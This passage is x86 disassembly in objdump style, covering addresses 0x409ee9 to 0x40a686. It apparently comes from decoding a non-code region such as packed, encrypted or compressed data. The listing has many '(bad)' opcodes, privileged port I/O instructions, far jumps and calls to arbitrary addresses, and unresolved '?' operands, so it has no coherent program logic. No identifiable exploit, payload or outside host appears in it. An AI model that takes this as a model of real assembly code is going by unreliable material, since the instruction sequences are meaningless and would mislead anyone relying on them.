  409ee9:	(bad)  
  409eea:	call   0x20a6:0xc18b8ac9
  409ef1:	push   ebx
  409ef2:	clc    
  409ef3:	mov    al,ds:0x5575ad9
  409ef8:	dec    edi
  409ef9:	sub    eax,DWORD PTR [ebx]
  409efb:	lods   al,BYTE PTR ds:[esi]
  409efc:	in     eax,dx
  409efd:	and    bl,BYTE PTR [esi+0x721ba52e]
  409f03:	jns    0x409e93
  409f05:	jle    0x409efc
  409f07:	sub    eax,0xf6d4d5
  409f0c:	jae    0x409f17
  409f0e:	xchg   ebx,eax
  409f0f:	adc    esp,esp
  409f11:	(bad)  
  409f13:	xor    eax,0xb65e7b0e
  409f18:	and    BYTE PTR [edi-0x4a],al
  409f1b:	retf   0xc5c6
  409f1e:	xor    bl,bh
  409f20:	out    dx,eax
  409f21:	dec    ecx
  409f22:	push   edx
  409f23:	and    eax,0xabdd3be2
  409f28:	cmp    eax,0xcee9da4c
  409f2d:	push   ds
  409f2e:	das    
  409f2f:	call   0xbead65dd
  409f34:	scas   eax,DWORD PTR es:[edi]
  409f35:	nop
  409f36:	inc    ebx
  409f37:	rcl    cl,cl
  409f39:	push   es
  409f3a:	(bad)
  409f3d:	jmp    0xf04aa08e
  409f42:	push   cs
  409f43:	xor    ah,dl
  409f45:	and    DWORD PTR [esi],edi
  409f47:	fwait
  409f48:	add    esi,ecx
  409f4a:	arpl   WORD PTR [esi],si
  409f4c:	jp     0x409f3d
  409f4e:	fnstenv [ebx]
  409f50:	push   es
  409f51:	sbb    eax,edx
  409f53:	rcr    DWORD PTR ds:0x5e6532cf,0x16
  409f5a:	div    DWORD PTR [edx+edx*4+0x6f]
  409f5e:	xor    edx,ebx
  409f60:	adc    al,0xbc
  409f62:	lods   al,BYTE PTR ds:[esi]
  409f63:	xor    eax,0xc23ccf1f
  409f68:	lahf   
  409f69:	ret    0xd0d9
  409f6c:	or     al,BYTE PTR [esi]
  409f6e:	mov    bh,0xa4
  409f70:	or     edi,eax
  409f72:	fidivr DWORD PTR ds:0x4f8ac106
  409f78:	imul   ecx,DWORD PTR [edi-0x21756307],0x983fcac0
  409f82:	cs add ah,bl
  409f85:	outs   dx,BYTE PTR ds:[esi]
  409f86:	(bad)  
  409f87:	enter  0x22f7,0x2d
  409f8b:	ja     0x409fae
  409f8d:	xchg   esi,eax
  409f8e:	into   
  409f8f:	jecxz  0x409f8f
  409f91:	or     eax,0x7b5c62c8
  409f96:	xchg   ch,al
  409f98:	js     0x409f25
  409f9a:	push   0x7d
  409f9c:	test   DWORD PTR [ebx],esi
  409f9e:	adc    cl,dh
  409fa0:	lea    eax,[ebx+eiz*1]
  409fa3:	dec    edi
  409fa4:	cli    
  409fa5:	push   esp
  409fa6:	and    dh,ch
  409fa8:	rcr    BYTE PTR [edx-0x39ed3ad3],1
  409fae:	addr16 ja 0x409fb6
  409fb1:	ret    
  409fb2:	xor    BYTE PTR ds:0xafde9da1,dl
  409fb8:	enter  0xb606,0x28
  409fbc:	add    dh,BYTE PTR [edi-0x22]
  409fbf:	xchg   ebx,eax
  409fc0:	test   eax,0x2bf531f3
  409fc5:	test   ebp,ebp
  409fc7:	test   eax,0xd39645a7
  409fcc:	mov    ebx,0xbec015c1
  409fd1:	repnz dec edi
  409fd3:	xlat   BYTE PTR ds:[ebx]
  409fd4:	mov    edx,0x3d9bbb36
  409fd9:	popf   
  409fda:	test   DWORD PTR [ecx-0x30],ebp
  409fdd:	cmp    BYTE PTR [edx+0x65dbb506],al
  409fe3:	inc    eax
  409fe4:	or     dl,BYTE PTR [edi]
  409fe6:	ja     0x409f7b
  409fe8:	or     dl,BYTE PTR cs:[ecx+0x5b]
  409fec:	jmp    0x1355:0xe2e6021f
  409ff3:	push   ds
  409ff4:	fwait
  409ff5:	retf   
  409ff6:	and    ebx,ebx
  409ff8:	mov    DWORD PTR [esi+eiz*2+0x1b],eax
  409ffc:	or     eax,ebp
  409ffe:	pop    ecx
  409fff:	cmp    BYTE PTR [esp+ebx*8+0x73],dh
  40a003:	cmc    
  40a004:	fwait
  40a005:	and    BYTE PTR [ebp-0x18859a6],al
  40a00b:	sub    eax,0xc85591d7
  40a010:	or     edi,ebx
  40a012:	into   
  40a013:	call   0x443f:0x4d3a91c1
  40a01a:	repz cli 
  40a01c:	and    DWORD PTR [ebx-0x22],0xffffff88
  40a020:	xor    eax,0x61a528a4
  40a025:	ds inc eax
  40a027:	mov    ds:0x5277ed84,al
  40a02c:	sub    BYTE PTR [eax-0x7],al
  40a02f:	fld    DWORD PTR [ebx+0x513219e6]
  40a035:	and    BYTE PTR [ecx+0x33],cl
  40a038:	jl     0x40a08f
  40a03a:	aad    0x39
  40a03c:	mov    edi,gs
  40a03e:	je     0x40a02d
  40a040:	and    eax,0x49c716dd
  40a045:	out    0xe2,al
  40a047:	xchg   ebx,eax
  40a048:	loope  0x40a06e
  40a04a:	icebp  
  40a04b:	imul   esp,ecx,0x60
  40a04e:	jo     0x40a0c4
  40a050:	adc    al,0x4c
  40a052:	or     BYTE PTR es:[ecx-0x8d428d4],dh
  40a059:	add    DWORD PTR [ebp+0x77],ecx
  40a05c:	call   FWORD PTR [edx-0x2e71dc5c]
  40a062:	dec    edi
  40a063:	jns    0x40a061
  40a065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a066:	push   esi
  40a068:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a069:	mov    eax,ds:0x585b65cf
  40a06e:	ret    
  40a06f:	mov    edi,0x94e88595
  40a074:	add    DWORD PTR [eax],0xf05f2d4
  40a07a:	pop    esp
  40a07b:	push   ebx
  40a07c:	cmp    DWORD PTR [edi-0x75],0x4abf6890
  40a083:	test   al,0xad
  40a085:	pop    edx
  40a086:	cmp    DWORD PTR [edx],ebx
  40a088:	dec    eax
  40a089:	add    DWORD PTR [ebp-0x41b7d52d],ebx
  40a08f:	sbb    BYTE PTR ds:0xc74f7d56,bl
  40a095:	xchg   ebx,eax
  40a096:	(bad)  
  40a099:	pushf  
  40a09a:	test   DWORD PTR [ebp-0x577ee6eb],esi
  40a0a0:	jl     0x40a059
  40a0a2:	push   es
  40a0a3:	jb     0x40a11c
  40a0a5:	jns    0x40a0e9
  40a0a7:	stc    
  40a0a8:	sub    edi,esi
  40a0aa:	shl    BYTE PTR [edi],cl
  40a0ac:	xor    esi,edx
  40a0ae:	lock ret 
  40a0b0:	out    0xc3,al
  40a0b2:	sahf   
  40a0b3:	and    BYTE PTR [esp+edi*2],dh
  40a0b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0b7:	cs in  al,0x92
  40a0ba:	fsub   st(0),st
  40a0bc:	mov    eax,ds:0xd82e3b36
  40a0c1:	shr    al,1
  40a0c3:	adc    ebp,DWORD PTR [ebx]
  40a0c5:	adc    al,0x67
  40a0c7:	dec    eax
  40a0c8:	loope  0x40a06c
  40a0ca:	outs   dx,DWORD PTR ds:[esi]
  40a0cb:	or     al,0xfe
  40a0cd:	loope  0x40a122
  40a0cf:	dec    esi
  40a0d0:	shl    BYTE PTR [ecx-0x308f2fb],0x4b
  40a0d7:	popf   
  40a0d8:	sbb    eax,0xfe7fb6a2
  40a0dd:	ins    BYTE PTR es:[edi],dx
  40a0de:	or     al,ch
  40a0e0:	fs jge 0x40a073
  40a0e3:	push   ebp
  40a0e4:	mov    ss,WORD PTR [ebp-0x41]
  40a0e7:	add    DWORD PTR [edx+0x6d],edx
  40a0ea:	cmp    bh,BYTE PTR [ebx]
  40a0ec:	add    al,0x1c
  40a0ee:	or     DWORD PTR [ebp-0x17404dda],ecx
  40a0f4:	jle    0x40a0b1
  40a0f6:	fs push eax
  40a0f8:	mov    ds:0xaee04e3b,eax
  40a0fd:	pop    ebx
  40a0fe:	adc    esi,DWORD PTR [esi-0x7b]
  40a101:	mov    BYTE PTR [ebp-0x2d],dh
  40a104:	repnz xchg edx,eax
  40a106:	or     eax,0xf59ae11a
  40a10b:	inc    ebp
  40a10c:	add    eax,0x6a839584
  40a111:	sbb    DWORD PTR [edi-0x6c3ede51],esp
  40a117:	fdivr  st,st(3)
  40a119:	jle    0x40a104
  40a11b:	push   edi
  40a11c:	add    eax,0xf1d16d3
  40a121:	ret    0xbbbf
  40a124:	adc    dh,0x2b
  40a127:	retf   
  40a128:	add    bl,bh
  40a12a:	inc    edi
  40a12b:	mov    DWORD PTR [ebx+0x1c203dc6],eax
  40a131:	imul   ebp,DWORD PTR [eax],0xffffffb0
  40a134:	out    0xd9,eax
  40a136:	sub    BYTE PTR [edx-0x3ef60f2c],ch
  40a13c:	cmp    cl,bh
  40a13e:	das    
  40a13f:	sahf   
  40a140:	outs   dx,DWORD PTR ds:[esi]
  40a141:	(bad)  
  40a143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a144:	xlat   BYTE PTR ds:[ebx]
  40a145:	in     al,dx
  40a146:	jl     0x40a1c2
  40a148:	icebp  
  40a149:	(bad)
  40a14d:	mov    edi,0x8af5383b
  40a152:	or     DWORD PTR [ebx],edx
  40a154:	push   edi
  40a155:	aas    
  40a156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a157:	pop    ss
  40a158:	cld    
  40a159:	mov    dh,0x95
  40a15b:	dec    ecx
  40a15c:	rol    DWORD PTR [ecx],cl
  40a15e:	mov    edi,0xf3a51ac6
  40a163:	fld    QWORD PTR [eax-0x4ad15b3a]
  40a169:	mov    esi,0xbe2e5a72
  40a16e:	lds    ebx,FWORD PTR [esi+edi*2]
  40a171:	push   edi
  40a172:	mov    bl,0x15
  40a174:	mov    al,ds:0x99039cf0
  40a179:	push   esi
  40a17a:	mov    ch,0x35
  40a17c:	rcr    DWORD PTR [eax],0xff
  40a17f:	bound  eax,QWORD PTR [esi]
  40a181:	mov    ebx,0xef8615b
  40a186:	pop    esi
  40a187:	(bad)  
  40a188:	jle    0x40a17a
  40a18a:	push   ds
  40a18b:	dec    ebx
  40a18c:	cdq    
  40a18d:	inc    esp
  40a18e:	add    al,BYTE PTR [ebp+0x700ebd06]
  40a194:	jmp    0xbff0:0x6ae8b1e7
  40a19b:	mov    eax,0x3ff8694
  40a1a0:	mov    ?,edx
  40a1a2:	cmc    
  40a1a3:	adc    BYTE PTR [ecx+0x47],bh
  40a1a6:	xchg   ebp,eax
  40a1a7:	out    dx,al
  40a1a8:	xchg   edi,eax
  40a1a9:	push   ss
  40a1aa:	mov    ecx,0x2e8f82
  40a1af:	jge    0x40a1fc
  40a1b1:	jb     0x40a20b
  40a1b3:	dec    esp
  40a1b4:	inc    ecx
  40a1b5:	jl     0x40a1f2
  40a1b7:	push   ebx
  40a1b8:	dec    esi
  40a1b9:	loop   0x40a1d6
  40a1bb:	and    al,BYTE PTR cs:[eax-0x8]
  40a1bf:	dec    edi
  40a1c0:	div    ebx
  40a1c2:	dec    edi
  40a1c3:	cmp    ah,BYTE PTR [edi-0xb]
  40a1c6:	call   0xb559:0xd43f527c
  40a1cd:	ja     0x40a15c
  40a1cf:	cwde   
  40a1d0:	aad    0xb9
  40a1d2:	fs push edi
  40a1d4:	jl     0x40a231
  40a1d6:	pop    edi
  40a1d7:	cli    
  40a1d8:	and    ebp,DWORD PTR [eax+0xd]
  40a1db:	inc    esp
  40a1dc:	jns    0x40a1e3
  40a1de:	stos   DWORD PTR es:[edi],eax
  40a1df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1e0:	leave  
  40a1e1:	dec    eax
  40a1e2:	adc    edi,DWORD PTR ds:0x954ae403
  40a1e8:	jb     0x40a17d
  40a1ea:	mov    ds,WORD PTR [eax+edx*4]
  40a1ed:	in     eax,0x87
  40a1ef:	mov    ds:0xccf12ed8,eax
  40a1f4:	mov    ds:0xffc04f7f,al
  40a1f9:	jo     0x40a1c2
  40a1fb:	int    0xcd
  40a1fd:	pop    eax
  40a1fe:	and    DWORD PTR [esi+0x7d],ebx
  40a201:	pop    ss
  40a202:	mov    DWORD PTR [edi+0x62],esp
  40a205:	mov    ss,WORD PTR [ebx+0x54f588e8]
  40a20b:	or     al,0xc7
  40a20d:	push   esi
  40a20e:	xchg   DWORD PTR [ebx+ebp*1-0x1d9227eb],edx
  40a215:	into   
  40a216:	lock enter 0x310,0x46
  40a21b:	xchg   esp,eax
  40a21c:	xor    eax,0x4ef8bfef
  40a221:	sub    al,0x42
  40a223:	ss hlt 
  40a225:	push   es
  40a226:	(bad)  
  40a227:	out    dx,al
  40a228:	mov    dh,0xd8
  40a22a:	or     eax,0x43829c76
  40a22f:	call   0xf2bcea5b
  40a234:	shl    DWORD PTR [ecx-0x4cc7527e],0x81
  40a23b:	sbb    DWORD PTR ds:0x565ffe4,esi
  40a241:	stos   BYTE PTR es:[edi],al
  40a242:	sub    eax,0xc91caf08
  40a247:	sub    eax,0x894c1b4c
  40a24c:	(bad)  
  40a24d:	imul   edx,esi,0x7d
  40a250:	inc    ecx
  40a251:	(bad)  
  40a252:	mov    cl,0x7d
  40a254:	xlat   BYTE PTR ds:[ebx]
  40a255:	cmp    DWORD PTR [edx-0x2397015c],edi
  40a25b:	call   0x39003430
  40a260:	outs   dx,DWORD PTR ds:[esi]
  40a261:	iret   
  40a262:	inc    esp
  40a263:	cmp    eax,0xe8078e48
  40a268:	and    DWORD PTR [edi+edi*2],0x54
  40a26c:	and    DWORD PTR [esi+0x7cc2cf8a],ebp
  40a272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a273:	sub    eax,0x3e7d9258
  40a278:	pop    edi
  40a279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a27a:	xchg   esp,eax
  40a27b:	icebp  
  40a27c:	add    al,BYTE PTR [eax]
  40a27e:	dec    eax
  40a27f:	push   ds
  40a280:	cmp    edi,DWORD PTR [eax]
  40a282:	jmp    0x1f266ae9
  40a287:	fst    st(1)
  40a289:	fldenv [ecx-0x2fbf76b8]
  40a28f:	jmp    0xd46a:0x4de7321d
  40a296:	and    eax,0x493519a2
  40a29b:	shr    DWORD PTR [edi*1-0x6b873d9b],0x75
  40a2a3:	jns    0x40a242
  40a2a5:	daa    
  40a2a6:	jmp    0x87921caf
  40a2ab:	mov    esp,0x378e909
  40a2b0:	in     al,0x53
  40a2b2:	(bad)  
  40a2b3:	out    dx,eax
  40a2b4:	sti    
  40a2b5:	lahf   
  40a2b6:	xor    DWORD PTR [esi+0x77],0x13
  40a2ba:	or     DWORD PTR [eax-0x267d12a8],esi
  40a2c0:	mov    al,ds:0x1831597a
  40a2c5:	inc    edx
  40a2c6:	es inc esp
  40a2c8:	ss mov edx,0x8a22f4e4
  40a2ce:	adc    ch,BYTE PTR [eax+0x13e586eb]
  40a2d4:	push   ecx
  40a2d5:	mov    eax,0x795089c9
  40a2da:	dec    edi
  40a2db:	inc    edx
  40a2dc:	int3   
  40a2dd:	or     BYTE PTR [edx+0x1a],al
  40a2e0:	mov    WORD PTR [esi+0x3009bc60],fs
  40a2e6:	rol    DWORD PTR [eax],cl
  40a2e8:	jge    0x40a2e1
  40a2ea:	xchg   edi,eax
  40a2eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2ec:	lds    edi,FWORD PTR [edi+0x19]
  40a2ef:	gs loope 0x40a332
  40a2f2:	xor    esp,DWORD PTR fs:[ebx]
  40a2f5:	xlat   BYTE PTR ds:[ebx]
  40a2f6:	daa    
  40a2f7:	in     al,dx
  40a2f8:	dec    ecx
  40a2f9:	shl    bl,0x71
  40a2fc:	int    0x2d
  40a2fe:	sub    ch,dh
  40a300:	cdq    
  40a301:	push   0xb1be03ec
  40a306:	call   0x76a8408a
  40a30b:	xchg   esi,eax
  40a30c:	cmp    dl,al
  40a30e:	je     0x40a383
  40a310:	inc    esp
  40a311:	outs   dx,BYTE PTR ds:[esi]
  40a312:	sti    
  40a313:	mov    dh,0xe5
  40a315:	jae    0x40a2a1
  40a317:	popa   
  40a318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a319:	mov    dl,BYTE PTR [ecx]
  40a31b:	pop    ebp
  40a31c:	retf   0xf7c8
  40a31f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  40a321:	and    al,0xd9
  40a323:	jne    0x40a2d4
  40a325:	test   al,0xcf
  40a327:	jo     0x40a397
  40a329:	fwait
  40a32a:	add    ch,BYTE PTR [ecx-0x3]
  40a32d:	pop    ebx
  40a32e:	ins    DWORD PTR es:[edi],dx
  40a32f:	jnp    0x40a382
  40a331:	and    esp,eax
  40a333:	pushf  
  40a334:	pop    ebx
  40a335:	pop    esp
  40a336:	cmp    ch,BYTE PTR ds:0x2dce6a0c
  40a33c:	aad    0xf5
  40a33e:	cmp    eax,0x4a80d4d3
  40a343:	push   esp
  40a344:	ins    BYTE PTR es:[edi],dx
  40a345:	sub    DWORD PTR [eax],ebx
  40a347:	repnz pop eax
  40a349:	mov    esi,0x5e4b9d56
  40a34e:	push   esp
  40a34f:	jp     0x40a3c2
  40a351:	dec    esp
  40a352:	cvttps2pi mm4,QWORD PTR [edx+edi*1-0x55ca6b34]
  40a35a:	es sub ch,dh
  40a35d:	push   esi
  40a35e:	dec    esi
  40a35f:	fwait
  40a360:	sub    ah,BYTE PTR [edi-0x21b85053]
  40a366:	push   ecx
  40a367:	loopne 0x40a3b5
  40a369:	jmp    0x9551:0x823c3942
  40a370:	(bad)  
  40a371:	jno    0x40a369
  40a373:	je     0x40a32e
  40a375:	fs xchg edx,eax
  40a377:	jl     0x40a33d
  40a379:	push   edx
  40a37a:	cli    
  40a37b:	aas    
  40a37c:	test   al,0x24
  40a37e:	out    0x1e,eax
  40a380:	cld    
  40a381:	dec    ebp
  40a382:	cld    
  40a383:	xchg   esp,eax
  40a384:	(bad)  [esi+0x507ad82]
  40a38a:	and    esi,ebp
  40a38c:	cmp    dh,BYTE PTR [esi+0x62]
  40a38f:	or     DWORD PTR [edx+0x6a],esp
  40a392:	adc    DWORD PTR [ebx-0x32],eax
  40a395:	or     eax,0xac91275e
  40a39a:	mov    edi,0x407d429
  40a39f:	outs   dx,DWORD PTR ds:[esi]
  40a3a0:	out    dx,al
  40a3a1:	mov    ecx,0x7db6c4e7
  40a3a6:	arpl   WORD PTR [edi],bp
  40a3a8:	pop    edx
  40a3a9:	mov    ecx,0x7c22a19f
  40a3ae:	fwait
  40a3af:	mov    cl,0x36
  40a3b1:	lea    esp,[edx-0x36dd3fdc]
  40a3b7:	or     eax,DWORD PTR [ecx+0x15abdc7b]
  40a3bd:	mov    BYTE PTR [ecx-0x350484e3],bh
  40a3c3:	test   DWORD PTR [eax+0x26],esp
  40a3c6:	xchg   ebp,eax
  40a3c7:	test   eax,0x49f18f0b
  40a3cc:	call   0x34ede6c0
  40a3d1:	or     ecx,DWORD PTR [ecx]
  40a3d3:	call   0x4d22ecd6
  40a3d8:	dec    edx
  40a3d9:	or     edi,DWORD PTR [ecx]
  40a3db:	mov    WORD PTR [edx+eiz*8-0x43],ds
  40a3df:	test   BYTE PTR [edx],ah
  40a3e1:	adc    al,0x6c
  40a3e3:	out    0xde,al
  40a3e5:	pop    ss
  40a3e6:	repnz loopne 0x40a3c4
  40a3e9:	inc    edi
  40a3ea:	scas   al,BYTE PTR es:[edi]
  40a3eb:	dec    esp
  40a3ec:	dec    edi
  40a3ed:	repz pop esp
  40a3ef:	popa   
  40a3f0:	sub    al,ah
  40a3f2:	push   esi
  40a3f3:	add    cl,dh
  40a3f5:	mov    al,0x73
  40a3f8:	push   es
  40a3f9:	ret    
  40a3fa:	xchg   esi,esi
  40a3fc:	pop    esp
  40a3fd:	test   eax,0x72c72eef
  40a402:	ins    BYTE PTR es:[edi],dx
  40a403:	mov    dl,0x72
  40a405:	sub    DWORD PTR ds:0x45746245,edx
  40a40b:	and    eax,esi
  40a40d:	popf   
  40a40e:	inc    esp
  40a40f:	cli    
  40a410:	push   ebx
  40a411:	imul   ebx,DWORD PTR [ebx-0x1d99aac6],0xbb17576f
  40a41b:	gs mov cs,WORD PTR cs:[ebp+0x2b]
  40a420:	adc    BYTE PTR [ecx*1+0x26b2bb9c],cl
  40a427:	jae    0x40a4a1
  40a429:	mov    esi,0x82934ee2
  40a42e:	xor    bl,BYTE PTR [edi-0x5c838a21]
  40a434:	mov    esi,0xd650758f
  40a439:	adc    al,0x1e
  40a43b:	jl     0x40a42e
  40a43d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a43e:	jp     0x40a3fc
  40a440:	cmc    
  40a441:	arpl   dx,si
  40a443:	je     0x40a44f
  40a445:	cmc    
  40a446:	xchg   ebx,esp
  40a448:	jne    0x40a3d1
  40a44a:	lds    ecx,FWORD PTR [edi-0x44]
  40a44d:	jnp    0x40a471
  40a44f:	adc    BYTE PTR [edi+0x21ee3ef6],bh
  40a455:	ins    DWORD PTR es:[edi],dx
  40a456:	jnp    0x40a3e3
  40a458:	push   esp
  40a459:	fdiv   DWORD PTR [esi+0x17]
  40a45c:	popf   
  40a45d:	xor    ah,BYTE PTR [eiz*4-0x1a945964]
  40a464:	or     DWORD PTR [ecx-0x64592751],edx
  40a46a:	sbb    esp,DWORD PTR [edx]
  40a46c:	outs   dx,BYTE PTR ds:[esi]
  40a46d:	fwait
  40a46e:	sbb    al,0x87
  40a470:	shl    BYTE PTR [eax-0x6e241fbb],0xca
  40a477:	pop    ds
  40a478:	mov    esp,0x44c6b96a
  40a47d:	dec    edx
  40a47e:	in     al,0x48
  40a480:	les    edi,FWORD PTR [ebx+0x6a]
  40a483:	mov    ds:0xcc0aeacd,al
  40a488:	cmp    edi,DWORD PTR [ecx]
  40a48a:	add    al,0x3c
  40a48c:	fbld   TBYTE PTR [edi]
  40a48e:	xchg   BYTE PTR [ebx+0x72],ah
  40a491:	into   
  40a492:	ror    DWORD PTR [esi-0x45a2d9f4],cl
  40a498:	and    esi,eax
  40a49a:	mov    ds:0xa2bcc875,al
  40a49f:	pop    ss
  40a4a0:	mov    eax,DWORD PTR [edx-0x126f065a]
  40a4a6:	repnz out dx,al
  40a4a8:	sub    cl,BYTE PTR [ebp+0x6ea19acd]
  40a4ae:	sar    BYTE PTR [ebx+0x5e],1
  40a4b1:	nop
  40a4b2:	scas   al,BYTE PTR es:[edi]
  40a4b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4b5:	pop    ss
  40a4b6:	pushf  
  40a4b7:	mul    DWORD PTR [edi]
  40a4b9:	inc    esi
  40a4ba:	push   esi
  40a4bb:	xlat   BYTE PTR ds:[ebx]
  40a4bc:	inc    esi
  40a4bd:	push   ebx
  40a4be:	sti    
  40a4bf:	nop
  40a4c0:	jns    0x40a466
  40a4c2:	push   esp
  40a4c3:	push   0x79098bd9
  40a4c8:	fstsw  WORD PTR [edx+0x1e09a6eb]
  40a4cf:	push   ebp
  40a4d0:	outs   dx,BYTE PTR ds:[esi]
  40a4d1:	loop   0x40a51b
  40a4d3:	in     eax,dx
  40a4d4:	jg     0x40a4f3
  40a4d6:	sub    cl,cl
  40a4d8:	fwait
  40a4d9:	jmp    0x40a4a1
  40a4db:	and    eax,0xdfd15c3
  40a4e0:	lock mov ch,0xec
  40a4e3:	push   0xf410c062
  40a4e8:	dec    ebx
  40a4e9:	aam    0xb3
  40a4eb:	cwde   
  40a4ec:	idiv   BYTE PTR [edx+0x926fb7e]
  40a4f2:	stos   BYTE PTR es:[edi],al
  40a4f3:	rcl    DWORD PTR [esi+0x6f3547ef],1
  40a4f9:	and    ch,0x97
  40a4fc:	pop    esp
  40a4fd:	mov    dh,0x3c
  40a4ff:	xchg   BYTE PTR [eax-0x36],dl
  40a502:	mov    ah,0xb
  40a504:	jne    0x40a4af
  40a506:	jge    0x40a515
  40a508:	fnstsw WORD PTR [ecx]
  40a50a:	retf   
  40a50b:	inc    ecx
  40a50c:	xor    dh,BYTE PTR [eax+0x36]
  40a50f:	jg     0x40a505
  40a511:	xor    cl,bh
  40a513:	push   0x87b137f0
  40a518:	fwait
  40a519:	and    ah,BYTE PTR [esi+0x6708c524]
  40a51f:	inc    edx
  40a520:	arpl   WORD PTR [edx+edx*8+0x4c7da04c],si
  40a527:	dec    DWORD PTR [eax-0x87c1dbf]
  40a52d:	inc    edi
  40a52e:	repz xchg dh,dh
  40a531:	sub    al,dl
  40a533:	push   ss
  40a534:	sbb    esp,ecx
  40a536:	mov    ebp,0xdc95370
  40a53b:	repz mov al,ds:0xfac2d7ca
  40a541:	int    0x2e
  40a543:	cmp    bl,bh
  40a545:	dec    ecx
  40a546:	ja     0x40a4d4
  40a548:	aad    0x56
  40a54a:	adc    DWORD PTR [esi],esp
  40a54c:	outs   dx,BYTE PTR ds:[esi]
  40a54d:	add    BYTE PTR [ecx],bh
  40a54f:	inc    esp
  40a550:	cmp    cl,BYTE PTR [ecx+0x6dd399a5]
  40a556:	adc    BYTE PTR [eax-0x6c70540],0xb9
  40a55d:	or     eax,0xe05202e1
  40a562:	or     al,0xb7
  40a564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a565:	scas   eax,DWORD PTR es:[edi]
  40a566:	fwait
  40a567:	das    
  40a568:	addr16 push ss
  40a56a:	jbe    0x40a578
  40a56c:	push   es
  40a56d:	pop    eax
  40a56e:	call   0x2c2b:0x5618098c
  40a575:	imul   edi,DWORD PTR [ebx-0x5a],0x1f
  40a579:	cmp    DWORD PTR [ebx],ecx
  40a57b:	jno    0x40a5dc
  40a57d:	test   eax,0x883f5690
  40a582:	outs   dx,DWORD PTR ds:[esi]
  40a583:	push   edi
  40a584:	ror    DWORD PTR [ebp-0x13],cl
  40a587:	pop    ds
  40a588:	add    eax,0x2d7986af
  40a58d:	ret    0x39dd
  40a590:	push   0xffffffa5
  40a592:	ret    
  40a593:	in     al,0x7f
  40a595:	aam    0xe1
  40a597:	cmp    DWORD PTR [edi],edi
  40a599:	or     esi,esp
  40a59b:	sub    ecx,ebp
  40a59d:	cmc    
  40a59e:	mov    BYTE PTR [edi+0x55],dl
  40a5a1:	es pop edi
  40a5a3:	mov    ch,0x6f
  40a5a5:	repz jge 0x40a61b
  40a5a8:	sub    BYTE PTR [esi],bh
  40a5aa:	mov    dl,0xe1
  40a5ac:	out    0x29,al
  40a5ae:	dec    esi
  40a5af:	mov    fs,WORD PTR [edx-0x6a]
  40a5b2:	jno    0x40a61d
  40a5b4:	or     ch,BYTE PTR [eax]
  40a5b6:	inc    esi
  40a5b7:	das    
  40a5b8:	nop
  40a5b9:	dec    esi
  40a5ba:	aas    
  40a5bb:	cdq    
  40a5bc:	fidiv  DWORD PTR [ebx+ecx*1]
  40a5bf:	inc    ecx
  40a5c0:	in     al,0xa0
  40a5c2:	mov    ch,0xe3
  40a5c4:	xor    dh,BYTE PTR [ecx+0x7edf4ae5]
  40a5ca:	ret    
  40a5cb:	ja     0x40a60b
  40a5cd:	(bad)  
  40a5ce:	stos   DWORD PTR es:[edi],eax
  40a5cf:	adc    al,0x27
  40a5d1:	arpl   WORD PTR [ebx+0x5ed62ded],bx
  40a5d7:	mov    esp,0xa5ed90ec
  40a5dc:	in     al,dx
  40a5dd:	or     ebx,DWORD PTR [ebp-0x1e36b885]
  40a5e3:	imul   esp,ebp,0x25f6b035
  40a5e9:	pop    esi
  40a5ea:	ins    DWORD PTR es:[edi],dx
  40a5eb:	das    
  40a5ec:	aaa    
  40a5ed:	frstor ds:0x1c093179
  40a5f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5f4:	stos   DWORD PTR es:[edi],eax
  40a5f5:	cmp    al,0x1b
  40a5f7:	xchg   al,ah
  40a5f9:	xchg   ebx,eax
  40a5fa:	fwait
  40a5fb:	dec    esi
  40a5fc:	mov    BYTE PTR [edx-0x3350020],dl
  40a602:	das    
  40a603:	shl    BYTE PTR [eax],0x31
  40a606:	adc    eax,0xe371d6f5
  40a60b:	or     bl,al
  40a60d:	dec    edx
  40a60e:	setbe  BYTE PTR [ecx-0x5d]
  40a612:	or     eax,0xd1583d41
  40a617:	adc    eax,0x33470130
  40a61c:	pop    ebx
  40a61d:	inc    edi
  40a61e:	scas   al,BYTE PTR es:[edi]
  40a61f:	cdq    
  40a620:	mov    esi,?
  40a622:	imul   ebx,eax,0x1566704f
  40a628:	les    eax,FWORD PTR [edi+ebp*4+0x37c19afa]
  40a62f:	inc    edi
  40a630:	clc    
  40a631:	pop    ss
  40a632:	cs loopne 0x40a5d0
  40a635:	xchg   ebp,eax
  40a636:	lock data16 jmp 0x40a5d4
  40a63a:	mov    edi,0xc87be1fc
  40a63f:	cmp    BYTE PTR [eax+eax*1],bl
  40a642:	aaa    
  40a643:	pushf  
  40a644:	push   cs
  40a645:	mov    cl,0x8c
  40a647:	pop    esi
  40a648:	cmp    al,0x5e
  40a64a:	xchg   esi,eax
  40a64b:	push   ecx
  40a64c:	pop    ecx
  40a64d:	mov    ebp,DWORD PTR [esi+0x3fcf16e]
  40a653:	scas   eax,DWORD PTR es:[edi]
  40a654:	call   0xc695c1fc
  40a659:	pop    ecx
  40a65a:	lods   eax,DWORD PTR ds:[esi]
  40a65b:	sbb    DWORD PTR [ebp+0x5167132e],eax
  40a661:	xchg   esp,eax
  40a662:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a663:	mov    eax,0x9b9a2912
  40a668:	xchg   esi,eax
  40a669:	in     al,dx
  40a66a:	jp     0x40a629
  40a66c:	int    0x77
  40a66e:	ja     0x40a688
  40a670:	pop    eax
  40a671:	jmp    0xbfd7:0x5fec7df9
  40a678:	cmp    DWORD PTR [esi+0x1],eax
  40a67b:	lock out dx,al
  40a67d:	or     eax,0x7102e31a
  40a682:	dec    eax
  40a683:	mov    ah,bl
  40a685:	out    dx,al
  40a686:	icebp  
